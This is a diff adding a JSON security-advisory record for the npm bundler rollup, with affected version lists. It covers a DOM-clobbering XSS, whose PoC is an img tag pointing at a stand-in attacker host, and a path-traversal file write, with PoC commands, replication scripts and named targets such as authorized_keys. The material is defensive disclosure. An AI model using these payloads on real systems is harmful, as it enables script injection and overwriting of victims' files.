@@ -1,0 +1,290 @@
+{
+  "schema_version": 1,
+  "package": "rollup",
+  "purls": [
+    "pkg:npm/rollup"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 104,
+  "advisories": [
+    {
+      "id": "GHSA-gcx4-mw62-g8wm",
+      "primary_id": "CVE-2024-47068",
+      "aliases": [
+        "CVE-2024-47068"
+      ],
+      "cve_ids": [
+        "CVE-2024-47068"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "rollup",
+      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we\u2019ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+      "published": "2024-09-23T22:11:02Z",
+      "modified": "2026-02-04T04:33:59.011402Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rollup/rollup"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-gcx4-mw62-g8wm",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.29.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "4.13.0",
+        "4.13.2",
+        "4.14.1",
+        "4.14.2",
+        "4.15.0",
+        "4.16.0",
+        "4.16.1",
+        "4.16.3",
+        "4.17.0",
+        "4.17.1",
+        "4.17.2",
+        "4.18.0",
+        "4.18.1",
+        "4.19.0",
+        "4.19.1",
+        "4.19.2",
+        "4.20.0",
+        "4.21.0",
+        "4.21.1",
+        "4.21.2",
+        "4.21.3",
+        "4.22.0",
+        "4.22.2",
+        "4.22.3"
+      ]
+    },
+    {
+      "id": "GHSA-mw96-cpmx-2vgc",
+      "primary_id": "CVE-2026-27606",
+      "aliases": [
+        "CVE-2026-27606"
+      ],
+      "cve_ids": [
+        "CVE-2026-27606"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "rollup",
+      "summary": "Rollup 4 has Arbitrary File Write via Path Traversal",
+      "details": "### Summary\nThe Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.\n\n### Details\nThe vulnerability is caused by the combination of two flawed components in the Rollup core:\n\n1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\\`). \n    ```typescript\n    // src/utils/sanitizeFileName.ts (Line 3)\n    const INVALID_CHAR_REGEX = /[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g;\n    ```\n    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.\n\n2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the \"sanitized\" filename.\n    ```typescript\n    // src/rollup/rollup.ts (Line 317)\n    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);\n    ```\n    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.\n\n### PoC\nA demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.\n\n**Scenario: CLI Named Input Exploit**\n1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).\n2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:\n    ```bash\n    rollup --input \"a/../../pwned.js=main.js\" --dir dist\n    ```\n3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.\n\n**Reproduction Files provided :**\n*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.\n*   `exploit.py`: Automated script to run the PoC and verify the file escape.\n\nvuln_app.js\n```js\nconst path = require('path');\nconst fs = require('fs');\n\n/**\n * REPLICATED ROLLUP VULNERABILITY\n * \n * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)\n * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)\n */\n\nfunction sanitize(name) {\n    // The vulnerability: Rollup's regex fails to strip dots and slashes, \n    // allowing path traversal sequences like '../'\n    return name.replace(/[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g, '_');\n}\n\nasync function build(userSuppliedName) {\n    const outputDir = path.join(__dirname, 'dist');\n    const fileName = sanitize(userSuppliedName);\n\n    // Vulnerability: path.resolve() follows traversal sequences in the filename\n    const outputPath = path.resolve(outputDir, fileName);\n\n    console.log(`[*] Target write path: ${outputPath}`);\n\n    if (!fs.existsSync(path.dirname(outputPath))) {\n        fs.mkdirSync(path.dirname(outputPath), { recursive: true });\n    }\n\n    fs.writeFileSync(outputPath, 'console.log(\"System Compromised!\");');\n    console.log(`[+] File written successfully.`);\n}\n\nbuild(process.argv[2] || 'bundle.js');\n\n```\n\nexploit.py\n```py\nimport subprocess\nfrom pathlib import Path\n\ndef run_poc():\n    # Target a file outside the 'dist' folder\n    poc_dir = Path(__file__).parent\n    malicious_filename = \"../pwned_by_rollup.js\"\n    target_path = poc_dir / \"pwned_by_rollup.js\"\n\n    print(f\"=== Rollup Path Traversal PoC ===\")\n    print(f\"[*] Malicious Filename: {malicious_filename}\")\n    \n    # Trigger the vulnerable app\n    subprocess.run([\"node\", \"poc/vuln_app.js\", malicious_filename])\n\n    if target_path.exists():\n        print(f\"[SUCCESS] File escaped 'dist' folder!\")\n        print(f\"[SUCCESS] Created: {target_path}\")\n        # target_path.unlink() # Cleanup\n    else:\n        print(\"[FAILED] Exploit did not work.\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n## POC \n```rollup --input \"bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js\" --dir dist```\n\n<img width=\"1918\" height=\"1111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4\" />\n\n\n\n### Impact\nThis is a **High** level of severity vulnerability.\n*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.\n*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.\n*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.",
+      "published": "2026-02-25T22:37:26Z",
+      "modified": "2026-03-02T12:59:05.159604Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/security/advisories/GHSA-mw96-cpmx-2vgc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27606"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/c60770d7aaf750e512c1b2774989ea4596e660b2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/c8cf1f9c48c516285758c1e11f08a54f304fd44e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/d6dee5e99bb82aac0bee1df4ab9efbde455452c3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rollup/rollup"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/releases/tag/v2.80.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/releases/tag/v3.30.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/releases/tag/v4.59.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mw96-cpmx-2vgc",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.80.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "4.13.0",
+        "4.13.2",
+        "4.14.1",
+        "4.14.2",
+        "4.15.0",
+        "4.16.0",
+        "4.16.1",
+        "4.16.3",
+        "4.17.0",
+        "4.17.1",
+        "4.17.2",
+        "4.18.0",
+        "4.18.1",
+        "4.19.0",
+        "4.19.1",
+        "4.19.2",
+        "4.20.0",
+        "4.21.0",
+        "4.21.1",
+        "4.21.2",
+        "4.21.3",
+        "4.22.0",
+        "4.22.2",
+        "4.22.3",
+        "4.22.4",
+        "4.22.5",
+        "4.23.0",
+        "4.24.0",
+        "4.24.3",
+        "4.25.0",
+        "4.26.0",
+        "4.27.2",
+        "4.27.3",
+        "4.27.4",
+        "4.28.0",
+        "4.28.1",
+        "4.30.0.0",
+        "4.30.0.1",
+        "4.30.1",
+        "4.31.0",
+        "4.32.0",
+        "4.34.0",
+        "4.34.1",
+        "4.34.2",
+        "4.34.4",
+        "4.34.5",
+        "4.34.6",
+        "4.34.7",
+        "4.34.8",
+        "4.34.9",
+        "4.35.0",
+        "4.36.0",
+        "4.37.0",
+        "4.38.0",
+        "4.39.0",
+        "4.40.0",
+        "4.40.1",
+        "4.40.2",
+        "4.41.0",
+        "4.41.1",
+        "4.42.0",
+        "4.43.0",
+        "4.44.0",
+        "4.44.1",
+        "4.44.2",
+        "4.45.0",
+        "4.45.1",
+        "4.45.3",
+        "4.46.2",
+        "4.46.3",
+        "4.46.4",
+        "4.47.1",
+        "4.48.0",
+        "4.48.1",
+        "4.49.0",
+        "4.50.0",
+        "4.50.1",
+        "4.50.2",
+        "4.51.0",
+        "4.52.0",
+        "4.52.2",
+        "4.52.3",
+        "4.52.5",
+        "4.53.1",
+        "4.53.2",
+        "4.53.3",
+        "4.53.4",
+        "4.53.5",
+        "4.54.0",
+        "4.55.0",
+        "4.55.1",
+        "4.55.2",
+        "4.55.3",
+        "4.56.0",
+        "4.57.0",
+        "4.57.1",
+        "4.58.0"
+      ]
+    }
+  ]
+}
